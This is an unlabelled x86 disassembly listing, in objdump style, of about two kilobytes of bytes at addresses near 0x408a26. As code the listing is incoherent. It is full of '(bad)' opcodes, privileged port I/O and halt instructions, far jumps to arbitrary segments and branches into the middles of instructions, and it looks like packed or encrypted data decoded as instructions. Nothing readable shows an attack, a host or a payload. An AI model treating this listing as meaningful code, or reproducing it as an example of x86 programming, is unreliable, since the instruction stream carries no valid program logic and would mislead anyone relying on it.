  408a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a27:	xor    eax,0xbf796a7a
  408a2c:	jle    0x4089d4
  408a2e:	fwait
  408a2f:	cld    
  408a30:	les    ebx,FWORD PTR [eax-0x5c]
  408a33:	xor    bl,BYTE PTR [ebx+ecx*4-0x2828c333]
  408a3a:	xchg   ebx,eax
  408a3b:	ss hlt 
  408a3d:	mov    BYTE PTR [edx-0x1e],bh
  408a40:	add    cl,BYTE PTR [ebp+0xf]
  408a43:	mov    edx,ds
  408a45:	aam    0x2a
  408a47:	out    dx,al
  408a48:	std    
  408a49:	rcr    DWORD PTR [esi-0x1b],cl
  408a4c:	and    eax,0x1102f6e6
  408a51:	bound  ebx,QWORD PTR ds:0x238ba096
  408a57:	sbb    ch,BYTE PTR [edi]
  408a59:	leave  
  408a5a:	aaa    
  408a5b:	jns    0x4089ef
  408a5d:	repz and al,0x1f
  408a60:	ja     0x408a92
  408a62:	mov    al,al
  408a64:	or     BYTE PTR [edi],dh
  408a66:	add    cx,WORD PTR [esp+0x23]
  408a6b:	mov    eax,0x7d475f40
  408a70:	and    cl,BYTE PTR [ebx+0x74]
  408a73:	sub    BYTE PTR [esi-0x153b8643],ah
  408a79:	jl     0x408a9c
  408a7b:	inc    ebx
  408a7c:	test   eax,0xe9ff2f6e
  408a81:	jnp    0x408af7
  408a83:	in     al,0x5b
  408a85:	inc    esp
  408a86:	or     al,0xe9
  408a88:	jno    0x408a3c
  408a8a:	dec    edx
  408a8b:	inc    ebp
  408a8c:	push   ecx
  408a8d:	gs (bad) 
  408a8f:	xor    eax,0x65a17539
  408a94:	xor    edx,DWORD PTR [ebp-0x52]
  408a97:	test   dh,bl
  408a99:	aaa    
  408a9a:	inc    edi
  408a9b:	pop    esi
  408a9c:	push   esi
  408a9d:	xor    eax,0x99c30c5a
  408aa2:	hlt    
  408aa3:	cdq    
  408aa4:	push   edi
  408aa5:	(bad)  
  408aa6:	stc    
  408aa7:	mov    dl,0xce
  408aa9:	xor    dl,0x72
  408aac:	xchg   esi,eax
  408aad:	push   es
  408aae:	sbb    eax,0x5daf8590
  408ab3:	xchg   ecx,eax
  408ab4:	add    eax,0xb7d947b3
  408ab9:	xor    DWORD PTR ds:0x55eaea53,edx
  408abf:	and    al,0x8
  408ac1:	or     dl,ah
  408ac3:	mov    cl,0xe8
  408ac5:	repnz pop edx
  408ac7:	mov    ah,0x1a
  408ac9:	out    dx,al
  408aca:	(bad)  
  408acb:	mov    ecx,0xcb700d9a
  408ad0:	inc    esp
  408ad1:	inc    edi
  408ad2:	jne    0x408ac4
  408ad4:	jo     0xd6107a7c
  408ada:	shl    ecx,0x5f
  408add:	repz add al,0x4
  408ae0:	in     al,0x4a
  408ae2:	pop    ds
  408ae3:	mov    BYTE PTR [edi+0x596109f2],dh
  408ae9:	jp     0x408a91
  408aeb:	or     eax,DWORD PTR ds:[ebx-0x77]
  408aef:	rcl    BYTE PTR [eax],1
  408af1:	adc    BYTE PTR [edi+0x8],al
  408af4:	mov    esp,0xbe3ae023
  408af9:	cmp    al,0x77
  408afb:	mov    bl,BYTE PTR [edi]
  408afd:	loop   0x408ad6
  408aff:	inc    edi
  408b00:	mov    edx,DWORD PTR [ecx-0x16]
  408b03:	dec    esp
  408b04:	adc    BYTE PTR [ebp-0x10],al
  408b07:	jle    0x408b5d
  408b09:	jecxz  0x408b4f
  408b0b:	mov    edx,DWORD PTR [eax*8+0x6f414799]
  408b12:	dec    edi
  408b13:	std    
  408b14:	fldenv [eax]
  408b16:	aam    0x8a
  408b18:	and    cl,0x7c
  408b1b:	add    al,0x6c
  408b1d:	fptan  
  408b1f:	(bad)  
  408b20:	(bad)  
  408b21:	leave  
  408b22:	leave  
  408b23:	xor    edi,DWORD PTR [ecx+eiz*8+0x78971926]
  408b2a:	adc    BYTE PTR [ebp-0x42],al
  408b2d:	add    BYTE PTR [esi+0x769eebb2],ah
  408b33:	js     0x408b15
  408b35:	jmp    0xb8b:0xedf278ec
  408b3c:	jne    0x408b2d
  408b3e:	je     0x408b59
  408b40:	xchg   esi,eax
  408b41:	jmp    0x55e3:0x79983697
  408b48:	aam    0xa5
  408b4a:	pop    ss
  408b4b:	dec    ebp
  408b4c:	dec    ebp
  408b4d:	pop    es
  408b4e:	fwait
  408b4f:	gs ret 
  408b51:	retf   
  408b52:	pop    ebx
  408b53:	pop    ds
  408b54:	ja     0x408ae8
  408b56:	jle    0x408bce
  408b58:	add    eax,0x4c89b54
  408b5d:	or     ebp,ebx
  408b5f:	and    DWORD PTR [ebp+0x5b5c4183],eax
  408b65:	inc    ecx
  408b66:	add    al,0x90
  408b68:	repz cmp ebp,DWORD PTR [esi+0x6571cc56]
  408b6f:	mov    bl,0x56
  408b71:	or     esp,edi
  408b73:	or     DWORD PTR [eax],esi
  408b75:	xchg   ebp,eax
  408b76:	adc    BYTE PTR [ebp+0x1fe5d3f4],al
  408b7c:	pop    es
  408b7d:	mov    ch,0xa0
  408b7f:	mov    al,0x7c
  408b81:	loop   0x408b5c
  408b83:	dec    eax
  408b84:	add    esi,DWORD PTR [eax-0x7517d176]
  408b8a:	push   0xffffffe0
  408b8c:	test   BYTE PTR [ecx],dh
  408b8e:	fwait
  408b8f:	sbb    al,0xdc
  408b91:	adc    ebp,ebp
  408b93:	and    ecx,DWORD PTR ss:[ecx+0x62]
  408b97:	stc    
  408b98:	sahf   
  408b99:	xor    dl,BYTE PTR ds:0xe58b6fd6
  408b9f:	mul    DWORD PTR [eax-0x6575cf26]
  408ba5:	jg     0x408bcb
  408ba7:	call   0x7278bc12
  408bac:	mov    es,WORD PTR [edi]
  408bae:	jp     0x408bd7
  408bb0:	mov    gs,ebx
  408bb2:	ins    DWORD PTR es:[edi],dx
  408bb3:	std    
  408bb4:	and    BYTE PTR [ebp+0x1a],0x9f
  408bb8:	or     BYTE PTR [edx],dh
  408bba:	test   DWORD PTR [esi-0x35ab4c09],edx
  408bc0:	inc    esi
  408bc1:	and    edi,esi
  408bc3:	lods   al,BYTE PTR ds:[esi]
  408bc4:	adc    al,0x69
  408bc6:	push   es
  408bc7:	pop    ebx
  408bc8:	lods   eax,DWORD PTR ds:[esi]
  408bc9:	in     al,0xfc
  408bcb:	iret   
  408bcc:	xor    al,BYTE PTR [esi+0x4075b9b8]
  408bd2:	mov    eax,DWORD PTR [esp+esi*4]
  408bd5:	addr16 jb 0x408c25
  408bd8:	mov    BYTE PTR [edi+0xc316a1b],bl
  408bde:	int    0xed
  408be0:	jb     0x408c2e
  408be2:	loopne 0x408c0b
  408be4:	adc    ah,BYTE PTR [ebp-0x34]
  408be7:	inc    esp
  408be8:	ret    0x42fd
  408beb:	retf   0x35c8
  408bee:	sar    DWORD PTR [edx-0x3a2d748b],1
  408bf4:	rol    BYTE PTR ds:0x6cf8c1a0,1
  408bfa:	inc    ebp
  408bfb:	jo     0x408c40
  408bfd:	call   0xdb4393c5
  408c02:	test   al,0xd0
  408c04:	inc    ebx
  408c05:	test   DWORD PTR [ecx+0x4f],esp
  408c08:	mov    ds:0xd9551c10,al
  408c0d:	or     eax,0x8ab05e82
  408c12:	outs   dx,BYTE PTR ds:[esi]
  408c13:	aad    0xcc
  408c15:	call   0xfec75f9f
  408c1a:	je     0x408bb0
  408c1c:	mov    cl,0x45
  408c1e:	loopne 0x408c5f
  408c20:	arpl   WORD PTR [ebx-0x20],bp
  408c23:	mov    bh,0x0
  408c25:	mov    eax,ds:0x519d426a
  408c2a:	inc    ebx
  408c2b:	xchg   BYTE PTR [ecx+0x1751c716],dh
  408c31:	xchg   BYTE PTR [ebp-0x140ac67a],dh
  408c37:	push   ds
  408c38:	ins    BYTE PTR es:[edi],dx
  408c39:	or     al,0x80
  408c3b:	mov    WORD PTR [edi-0x56],?
  408c3e:	mov    dl,0xc
  408c40:	push   ds
  408c41:	(bad)  
  408c44:	xor    al,BYTE PTR [ebx+ebx*8]
  408c47:	loopne 0x408c4c
  408c49:	xchg   ecx,eax
  408c4a:	ret    0xe5c7
  408c4d:	push   ebp
  408c4e:	xchg   ebp,eax
  408c4f:	(bad)  
  408c50:	retf   
  408c51:	lods   al,BYTE PTR ds:[esi]
  408c52:	mov    eax,0x1d73702d
  408c57:	inc    eax
  408c58:	test   ecx,edi
  408c5a:	dec    esp
  408c5b:	push   cs
  408c5c:	sahf   
  408c5d:	inc    esp
  408c5e:	mov    ebx,0xa392d3d7
  408c63:	lods   al,BYTE PTR ds:[esi]
  408c64:	fcmovnu st,st(2)
  408c66:	cmp    ecx,0xfffffff4
  408c69:	and    eax,0xd49c8b8f
  408c6e:	pop    es
  408c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c70:	mov    WORD PTR [ebx+edx*8],fs
  408c73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c74:	inc    edx
  408c75:	loopne 0x408c46
  408c77:	and    bh,ch
  408c79:	(bad)  
  408c7a:	mov    cl,0x15
  408c7c:	cld    
  408c7d:	ins    BYTE PTR es:[edi],dx
  408c7e:	jge    0x408cdf
  408c80:	ins    BYTE PTR es:[edi],dx
  408c81:	outs   dx,DWORD PTR ds:[esi]
  408c82:	add    DWORD PTR [ecx+eiz*2],ebx
  408c85:	popa   
  408c86:	mov    edx,0xc78ff6ac
  408c8b:	scas   al,BYTE PTR es:[edi]
  408c8c:	inc    ebp
  408c8d:	mov    ?,WORD PTR [esi+0x3eb5fb79]
  408c93:	adc    eax,0xc2091148
  408c98:	or     DWORD PTR [ebp+0x55855b62],edi
  408c9e:	outs   dx,BYTE PTR ds:[esi]
  408c9f:	add    eax,0x2a658dba
  408ca4:	push   ss
  408ca5:	(bad)  
  408ca6:	jnp    0x408c7d
  408ca8:	hlt    
  408ca9:	(bad)  
  408caa:	mov    edx,0xedf786fc
  408caf:	cwde   
  408cb0:	jmp    0x3a3f8563
  408cb5:	sub    eax,0x924fd0ab
  408cba:	pop    edi
  408cbb:	aam    0xbd
  408cbd:	jg     0x408cc4
  408cbf:	add    eax,0x145afb63
  408cc4:	or     DWORD PTR [ecx-0x2e],esp
  408cc7:	test   DWORD PTR [edi],edi
  408cc9:	cli    
  408cca:	jo     0x408cc3
  408ccc:	xor    DWORD PTR [edx-0x725a3e22],edi
  408cd2:	in     eax,0xba
  408cd4:	pop    esp
  408cd5:	jmp    0x408c86
  408cd7:	and    BYTE PTR [edx],0x43
  408cda:	ror    BYTE PTR [edx-0x4cc0dad3],cl
  408ce0:	push   edi
  408ce1:	aad    0xf5
  408ce3:	xchg   edi,eax
  408ce4:	retf   0x733c
  408ce7:	pushf  
  408ce8:	lods   al,BYTE PTR ds:[esi]
  408ce9:	popa   
  408cea:	retf   
  408ceb:	scas   eax,DWORD PTR es:[edi]
  408cec:	mov    esp,0xd164fae5
  408cf1:	push   0x98147cb0
  408cf6:	adc    DWORD PTR [eax+esi*2-0x67],ebx
  408cfa:	out    dx,eax
  408cfb:	sar    BYTE PTR [esi],1
  408cfd:	icebp  
  408cfe:	adc    ebp,DWORD PTR [esi+0x2f5f7046]
  408d04:	dec    esp
  408d05:	icebp  
  408d06:	and    al,0x93
  408d08:	fsub   DWORD PTR [ebx+0x2b]
  408d0b:	ficom  DWORD PTR [ecx+ecx*2+0xd]
  408d0f:	jno    0x408d75
  408d11:	mov    edi,es
  408d13:	pop    es
  408d14:	stc    
  408d15:	jae    0x408cb7
  408d17:	idiv   DWORD PTR ds:0xcb1f943c
  408d1d:	cs add al,0xb
  408d20:	fcom   st(3)
  408d22:	call   0x6803863a
  408d27:	push   ss
  408d28:	mov    al,gs:0xa477d38
  408d2e:	sbb    eax,0xad5ca329
  408d33:	xchg   edi,eax
  408d34:	xchg   esi,eax
  408d35:	adc    BYTE PTR [edx-0x1a],al
  408d38:	xor    BYTE PTR [edx+0x5564e53a],al
  408d3e:	ss push esi
  408d40:	in     eax,0x36
  408d42:	fbstp  TBYTE PTR [esi+eax*1]
  408d45:	pop    ds
  408d46:	push   es
  408d47:	xchg   edi,eax
  408d48:	aam    0xb
  408d4a:	pop    esi
  408d4b:	dec    ebp
  408d4c:	and    ch,bh
  408d4e:	pop    ebp
  408d4f:	aaa    
  408d50:	and    DWORD PTR [edi-0x5f],0x7c7cee09
  408d57:	push   esi
  408d58:	and    al,0x77
  408d5a:	jmp    0x84436667
  408d5f:	dec    ebx
  408d60:	lahf   
  408d61:	pop    esp
  408d62:	out    0xfb,al
  408d64:	lea    esp,[edx+edi*8+0xdbd78c8]
  408d6b:	(bad)  
  408d6c:	inc    ecx
  408d6d:	mov    ebx,0x79c26e65
  408d72:	jecxz  0x408d94
  408d74:	outs   dx,BYTE PTR ds:[esi]
  408d75:	sbb    BYTE PTR [esi+ebp*1],ch
  408d78:	imul   ebx,esi,0x1ffc43f7
  408d7e:	cmc    
  408d7f:	lods   al,BYTE PTR ds:[esi]
  408d80:	mov    WORD PTR [esp+eiz*8-0xb89d496],ss
  408d87:	cmp    eax,0x6a07e1a6
  408d8c:	loopne 0x408da3
  408d8e:	or     ecx,DWORD PTR ds:0x67c430b1
  408d94:	aas    
  408d95:	push   0xffffffaa
  408d97:	inc    esp
  408d98:	shl    DWORD PTR [ebx-0x3],0xe3
  408d9c:	(bad)  
  408d9d:	mov    edi,0x7e64e166
  408da2:	or     eax,0xc9004981
  408da7:	mov    dl,0x31
  408da9:	call   0xda4f:0xedf0da98
  408db0:	lea    edx,[eax-0x70]
  408db3:	pop    eax
  408db4:	mov    ecx,0xebd7520b
  408db9:	aaa    
  408dba:	lahf   
  408dbb:	cmp    al,BYTE PTR [edi+0x19]
  408dbe:	push   edi
  408dbf:	inc    edi
  408dc0:	jb     0x408ddd
  408dc2:	inc    edx
  408dc3:	or     al,0xcf
  408dc5:	adc    BYTE PTR [edi],0x1b
  408dc8:	jns    0x408e49
  408dca:	rcr    DWORD PTR [edi-0x7f78f71c],0xe8
  408dd1:	leave  
  408dd2:	and    ebx,DWORD PTR [ecx]
  408dd4:	jo     0x408e44
  408dd6:	push   es
  408dd7:	add    ebp,DWORD PTR [ecx+0x5df440ef]
  408ddd:	out    dx,al
  408dde:	loopne 0x408df4
  408de0:	mov    dl,0x56
  408de2:	nop
  408de3:	into   
  408de4:	stos   BYTE PTR es:[edi],al
  408de5:	mov    gs,WORD PTR [edi]
  408de7:	daa    
  408de8:	mov    ah,0x58
  408dea:	lahf   
  408deb:	mov    bp,0x75c8
  408def:	and    eax,0x20ef9842
  408df4:	rcr    DWORD PTR [bp-0x3aa0],1
  408df9:	test   al,0x28
  408dfb:	dec    eax
  408dfc:	push   ebx
  408dfd:	xor    al,0xfc
  408dff:	sub    DWORD PTR [edi],eax
  408e01:	sbb    ah,dh
  408e03:	xchg   ebx,eax
  408e04:	(bad)  
  408e05:	icebp  
  408e06:	repnz pop edi
  408e08:	fcom   QWORD PTR [edx+eax*1+0x63a5d238]
  408e0f:	stos   DWORD PTR es:[edi],eax
  408e10:	mov    dh,0xf5
  408e12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e13:	(bad)  
  408e14:	pop    ecx
  408e15:	inc    ecx
  408e16:	ficomp WORD PTR [edx-0x26bc4939]
  408e1c:	xlat   BYTE PTR ds:[ebx]
  408e1d:	mov    ah,0x36
  408e1f:	in     al,0xe9
  408e21:	out    0x2c,eax
  408e23:	sbb    bh,bh
  408e25:	out    0xa2,eax
  408e27:	sar    DWORD PTR [edx],0xe3
  408e2a:	out    0xc8,eax
  408e2c:	mov    ah,0x43
  408e2e:	and    ch,BYTE PTR [ebp+0x1b]
  408e31:	push   0xefbd6a71
  408e36:	xchg   ebp,eax
  408e37:	bnd jbe 0x408dd4
  408e3a:	inc    ebp
  408e3b:	and    ch,BYTE PTR ds:0xc4b1afcb
  408e41:	imul   edx,DWORD PTR [ecx],0x74
  408e44:	adc    bl,BYTE PTR [edx+eiz*8]
  408e47:	push   0xffffffe0
  408e49:	repz adc ah,BYTE PTR ds:[ebx]
  408e4d:	xchg   ebx,eax
  408e4e:	popf   
  408e4f:	jg     0x408e8b
  408e51:	inc    eax
  408e52:	dec    esp
  408e53:	push   ecx
  408e54:	jnp    0x408e19
  408e56:	jl     0x408e16
  408e58:	and    al,0xa9
  408e5a:	sar    BYTE PTR [edi-0x7a1374cf],cl
  408e60:	addr16 add eax,0x89a684f5
  408e66:	mov    al,ds:0x20004080
  408e6b:	xchg   esi,eax
  408e6c:	jns    0x408e8a
  408e6e:	in     al,dx
  408e6f:	rcr    BYTE PTR [ebx+0x38361202],1
  408e75:	push   es
  408e76:	add    DWORD PTR [ebp+0x26],esi
  408e79:	push   edx
  408e7a:	sub    DWORD PTR gs:[ecx+ebx*2],esp
  408e7e:	fistp  QWORD PTR ds:0xd0ecbc98
  408e84:	push   ds
  408e85:	and    al,0x4d
  408e87:	dec    ecx
  408e88:	cmp    ecx,edx
  408e8a:	mov    bh,0x86
  408e8c:	jns    0x408e3c
  408e8e:	push   ebx
  408e8f:	stc    
  408e90:	xor    dl,BYTE PTR [esi+eax*1]
  408e93:	add    DWORD PTR [esi-0x5e],esp
  408e96:	ins    BYTE PTR es:[edi],dx
  408e97:	fwait
  408e98:	stc    
  408e99:	pop    ebx
  408e9a:	push   cs
  408e9b:	pop    esi
  408e9c:	mov    edx,0x6ed1f45c
  408ea1:	jmp    0x115d:0x8c1d1ac0
  408ea8:	lods   al,BYTE PTR ds:[esi]
  408ea9:	fistp  DWORD PTR ds:0x5a2ba5ef
  408eaf:	iret   
  408eb0:	jp     0x408f18
  408eb2:	mov    ch,cl
  408eb4:	xchg   edx,eax
  408eb5:	inc    esp
  408eb6:	xor    BYTE PTR [ecx],al
  408eb8:	and    ah,BYTE PTR [esi+0x6732f461]
  408ebe:	jbe    0x408eab
  408ec0:	lds    eax,FWORD PTR [esi]
  408ec2:	(bad)  
  408ec3:	push   ebp
  408ec4:	sub    edi,DWORD PTR [ecx]
  408ec6:	sub    al,0x52
  408ec8:	popf   
  408ec9:	sbb    DWORD PTR [edi],0x8756f8f
  408ecf:	adc    eax,0x1f048119
  408ed4:	adc    DWORD PTR [esi-0x6892491f],eax
  408eda:	fistp  QWORD PTR [eax+0x2f2bc500]
  408ee0:	sar    BYTE PTR [edi],cl
  408ee2:	add    BYTE PTR [ecx-0x4539e7b2],dl
  408ee8:	into   
  408ee9:	in     eax,0x8e
  408eeb:	ret    0xfdc9
  408eee:	enter  0x2abf,0xfb
  408ef2:	mov    bl,0x99
  408ef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ef5:	push   eax
  408ef6:	sbb    eax,0x2e231264
  408efb:	sub    DWORD PTR [ecx-0x3f],esp
  408efe:	and    eax,0x7f90f061
  408f03:	(bad)  
  408f04:	pop    esp
  408f05:	test   DWORD PTR [ecx],ebp
  408f07:	xchg   BYTE PTR [ecx-0x3d28e2fa],cl
  408f0d:	add    eax,0x5f707523
  408f12:	(bad)  
  408f13:	(bad)  
  408f15:	mul    BYTE PTR [edx+0x8]
  408f18:	mov    eax,ds:0x909e491d
  408f1d:	sbb    ebx,DWORD PTR [ecx+0x77871eec]
  408f23:	sahf   
  408f24:	aaa    
  408f25:	sub    eax,0xbc2be55a
  408f2a:	(bad)  
  408f2b:	xlat   BYTE PTR ds:[ebx]
  408f2c:	scas   eax,DWORD PTR es:[edi]
  408f2d:	int3   
  408f2e:	in     eax,0xcc
  408f30:	call   0x7604:0x966f0f5e
  408f37:	daa    
  408f38:	sahf   
  408f39:	push   ds
  408f3a:	mov    bh,0x58
  408f3c:	and    esi,edi
  408f3e:	in     eax,dx
  408f3f:	call   0x9ab1:0xbc2d69c2
  408f46:	fnsave [ecx+0xf]
  408f49:	sti    
  408f4a:	(bad)  
  408f4b:	int3   
  408f4c:	in     al,0xc4
  408f4e:	cmp    eax,0x3a8246d2
  408f53:	pop    edx
  408f54:	and    eax,0x3837ccf6
  408f59:	mov    bh,0xa5
  408f5b:	fild   QWORD PTR [edi+0x26]
  408f5e:	dec    esi
  408f5f:	pop    esi
  408f60:	sub    DWORD PTR [edx],esp
  408f62:	xor    bl,BYTE PTR [eax+0x5f532fa6]
  408f68:	leave  
  408f69:	xchg   esi,eax
  408f6a:	clc    
  408f6b:	dec    ebx
  408f6c:	lods   eax,DWORD PTR ds:[esi]
  408f6d:	scas   eax,DWORD PTR es:[edi]
  408f6e:	out    dx,al
  408f6f:	mov    dl,bh
  408f71:	pop    esp
  408f72:	xor    dh,BYTE PTR [esp+ebx*4-0x68]
  408f76:	inc    ebx
  408f77:	fcom   st(3)
  408f79:	mov    bl,0x93
  408f7b:	add    al,BYTE PTR [edi+ecx*4-0x13]
  408f7f:	pop    ecx
  408f80:	shr    DWORD PTR [ebp+0x28],0x47
  408f84:	loopne 0x408fbd
  408f86:	out    dx,al
  408f87:	push   cs
  408f88:	cwde   
  408f89:	dec    eax
  408f8a:	jne    0x408f76
  408f8c:	(bad)  
  408f8d:	push   0x287f6e1c
  408f92:	hlt    
  408f93:	and    BYTE PTR [ebp-0xd],bl
  408f96:	jmp    0x408f19
  408f98:	shl    BYTE PTR [edx-0x8],0xae
  408f9c:	add    DWORD PTR [ebx-0x5b7a4eb],ecx
  408fa2:	dec    edx
  408fa3:	imul   ecx,ebx,0x749e33b
  408fa9:	jnp    0x409002
  408fab:	xor    edx,DWORD PTR [ebp-0x355a340a]
  408fb1:	fwait
  408fb2:	aad    0x27
  408fb4:	les    eax,FWORD PTR [ecx]
  408fb6:	xchg   ebx,eax
  408fb7:	ret    
  408fb8:	pop    esi
  408fb9:	lods   eax,DWORD PTR ds:[esi]
  408fba:	in     al,0x49
  408fbc:	popa   
  408fbd:	mov    dh,0xba
  408fbf:	cmp    dh,bl
  408fc1:	adc    ebp,DWORD PTR [ebx+0x30da77c3]
  408fc7:	add    eax,0xeb6eb18d
  408fcc:	mov    bl,0xad
  408fce:	jne    0x408f91
  408fd0:	ins    DWORD PTR es:[edi],dx
  408fd1:	inc    ebx
  408fd2:	hlt    
  408fd3:	xchg   ebx,eax
  408fd4:	in     eax,0xc7
  408fd6:	mov    esi,DWORD PTR [edx]
  408fd8:	xor    esp,ecx
  408fda:	mov    ds:0x7022c669,al
  408fdf:	and    al,0xb8
  408fe1:	push   es
  408fe2:	jbe    0x409005
  408fe4:	inc    esi
  408fe5:	sbb    ecx,DWORD PTR [ebx+0x9]
  408fe8:	pop    esp
  408fe9:	push   es
  408fea:	repnz icebp 
  408fec:	int    0xeb
  408fee:	mov    cl,0x17
  408ff0:	scas   al,BYTE PTR es:[edi]
  408ff1:	xor    BYTE PTR [eax],dh
  408ff3:	sub    ebp,DWORD PTR [eax+eax*8+0x66]
  408ff7:	cmp    eax,0x6cd75610
  408ffc:	xchg   edx,eax
  408ffd:	pop    edx
  408ffe:	jmp    0x408faf
  409000:	sbb    DWORD PTR [ebx+0x2f],ebx
  409003:	sub    al,0xbb
  409005:	shl    DWORD PTR [edx+0x8c79854],cl
  40900b:	(bad)  [edx-0x14e0db0e]
  409011:	rcr    DWORD PTR [edi],0xb
  409014:	imul   eax,DWORD PTR [edx-0x38],0xffffffd3
  409018:	ins    BYTE PTR es:[edi],dx
  409019:	ror    BYTE PTR [ebx],1
  40901b:	out    dx,al
  40901c:	mov    al,BYTE PTR [edi]
  40901e:	mov    ebp,0x8d1c4c0c
  409023:	mov    ch,0x81
  409025:	ss out 0x7d,al
  409028:	test   esp,ebx
  40902a:	and    bh,0x62
  40902d:	sbb    ch,cl
  40902f:	xlat   BYTE PTR ds:[ebx]
  409030:	call   0x1afbf913
  409035:	(bad)  
  409036:	push   esp
  409037:	retf   0x3ea0
  40903a:	push   cs
  40903b:	dec    ecx
  40903c:	mov    ebx,0xee4ca08f
  409041:	fimul  DWORD PTR [ebp+0x2e8e64c9]
  409047:	inc    esi
  409048:	adc    DWORD PTR [edi+0x7a],esi
  40904b:	int3   
  40904c:	test   al,0xe8
  40904e:	xchg   edi,eax
  40904f:	test   cl,0x62
  409052:	(bad)  [ebp+esi*2+0xb5e972b]
  409059:	xor    ebp,ebp
  40905b:	into   
  40905c:	int    0xce
  40905e:	xchg   ebp,eax
  40905f:	xchg   BYTE PTR [edx],bh
  409061:	stc    
  409062:	pusha  
  409063:	fs dec ebp
  409065:	ret    0xb0da
  409068:	sub    ebx,esp
  40906a:	jmp    0x409030
  40906c:	mov    ds:0xc5f9f4eb,al
  409071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409072:	cmp    eax,0x9e838eb7
  409077:	xchg   esp,eax
  409078:	fdivr  QWORD PTR [eax-0x4578de97]
  40907e:	inc    eax
  40907f:	or     BYTE PTR [ecx+0x50],bh
  409082:	jae    0x4090c7
  409084:	in     eax,dx
  409085:	aad    0x62
  409087:	loop   0x40906b
  409089:	xchg   ebx,eax
  40908a:	mov    ebx,0x88bfafaa
  40908f:	lea    ebp,[ecx]
  409091:	dec    edi
  409092:	cmp    eax,DWORD PTR [eax-0x44a0c74f]
  409098:	xor    al,0x24
  40909a:	(bad)  
  40909b:	jecxz  0x4090ab
  40909d:	outs   dx,BYTE PTR ds:[esi]
  40909e:	inc    eax
  40909f:	call   FWORD PTR [ecx+0x72]
  4090a2:	cs pop ecx
  4090a4:	stc    
  4090a5:	inc    ebx
  4090a6:	(bad)  
  4090a7:	lahf   
  4090a8:	xchg   DWORD PTR [edi+esi*2+0x6043b379],eax
  4090af:	aaa    
  4090b0:	add    al,0x9d
  4090b2:	xor    eax,0x24af1ac8
  4090b7:	icebp  
  4090b8:	outs   dx,BYTE PTR ds:[esi]
  4090b9:	jg     0x40908a
  4090bb:	fwait
  4090bc:	test   BYTE PTR [esi],bh
  4090be:	fld    TBYTE PTR [ebp-0x743e80c9]
  4090c4:	push   ecx
  4090c5:	jne    0x409107
  4090c7:	mov    eax,ds:0x939f276c
  4090cc:	pop    ebx
  4090cd:	adc    al,0x12
  4090cf:	mov    bh,bh
  4090d1:	fsubr  DWORD PTR [esi-0x227d36ee]
  4090d7:	and    DWORD PTR [edx+0x4a],ecx
  4090da:	cmp    BYTE PTR [ecx],bl
  4090dc:	scas   al,BYTE PTR es:[edi]
  4090dd:	lods   eax,DWORD PTR ds:[esi]
  4090de:	js     0x40909b
  4090e0:	iret   
  4090e1:	stc    
  4090e2:	inc    ecx
  4090e3:	sbb    al,0xb3
  4090e5:	mov    esi,0xadca320c
  4090eb:	outs   dx,DWORD PTR ds:[esi]
  4090ec:	mov    ah,0x32
  4090ee:	mov    cl,0xc7
  4090f0:	inc    ebx
  4090f1:	or     eax,0x665dd576
  4090f6:	scas   eax,DWORD PTR es:[di]
  4090f8:	nop
  4090f9:	sub    ch,BYTE PTR [ebp-0x34]
  4090fc:	cmc    
  4090fd:	add    BYTE PTR [ebp+0x21],dh
  409100:	and    edi,DWORD PTR [edi+0x13c7b919]
  409106:	out    0x60,eax
  409108:	cdq    
  409109:	adc    edi,DWORD PTR [ecx]
  40910b:	(bad)  
  40910c:	lea    ecx,[edi-0x80]
  40910f:	xchg   edi,eax
  409110:	mov    esp,0x183aa928
  409115:	or     DWORD PTR [esi+edx*1-0x5706903f],ebp
  40911c:	push   ecx
  40911d:	cmc    
  40911e:	xchg   ch,ah
  409120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409121:	push   edi
  409122:	mov    bl,BYTE PTR [esi-0x1e]
  409125:	cmp    BYTE PTR [edx],cl
  409127:	mov    esi,0x7172bc69
  40912c:	jmp    0x512b722d
  409131:	xor    BYTE PTR [eax-0x576bc00e],0xc6
  409138:	xchg   esi,eax
  409139:	rol    DWORD PTR [ebp-0x21a6874f],cl
  40913f:	int3   
  409140:	or     eax,0xc11c59c5
  409145:	loopne 0x409155
  409147:	jns    0x409147
  409149:	xchg   ecx,eax
  40914a:	mov    ds:0x438c104d,eax
  40914f:	rol    DWORD PTR [ebx],cl
  409151:	aaa    
  409152:	jnp    0x409169
  409154:	push   ebp
  409155:	fdiv   st(3),st
  409157:	jl     0x409154
  409159:	and    ecx,DWORD PTR [edi-0x7a]
  40915c:	and    ebx,DWORD PTR [eax+0x39]
  40915f:	pop    esp
  409160:	add    BYTE PTR [ebx],bh
  409162:	xor    eax,0x70a980c5
  409167:	in     eax,dx
  409168:	test   DWORD PTR [edx+0x5597fa07],edx
  40916e:	cmc    
  40916f:	fwait
  409170:	repnz aam 0x1f
  409173:	add    ch,BYTE PTR [ecx+0x62]
  409176:	mov    WORD PTR [ecx],ds
  409178:	jge    0x409143
  40917a:	pop    esp
  40917b:	fs or  al,0x34
  40917e:	enter  0xcad1,0x8
  409182:	or     BYTE PTR [edi],bl
  409184:	xor    eax,0xd8e336fb
  409189:	mov    bh,0x9d
  40918b:	js     0x4091dc
  40918d:	sbb    ecx,eax
  40918f:	ins    BYTE PTR es:[edi],dx
  409190:	mov    ebx,0x996d6510
  409195:	mov    ecx,ebx
  409197:	push   ecx
  409198:	inc    edx
  409199:	sbb    cl,cl
  40919b:	sub    ch,BYTE PTR [esi+0x70fcc995]
  4091a1:	dec    esi
  4091a2:	mov    cl,0xac
  4091a4:	fcmovnbe st,st(6)
  4091a6:	xor    ch,BYTE PTR [ebp+0x7188ca60]
  4091ac:	jg     0x4091dc
  4091ae:	sti    
  4091af:	pop    edi
  4091b0:	in     al,dx
  4091b1:	push   0x23613e69
  4091b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091b7:	call   DWORD PTR [ebp+0x6bc62460]
  4091bd:	rol    ebp,1
  4091bf:	(bad)  
  4091c0:	sub    eax,0x693fc606
  4091c5:	or     DWORD PTR [ebp+0x78],edx
  4091c8:	sahf   
  4091c9:	in     eax,0x91
  4091cb:	adc    eax,0x25e4a321
  4091d0:	cli    
  4091d1:	cmp    ch,ch
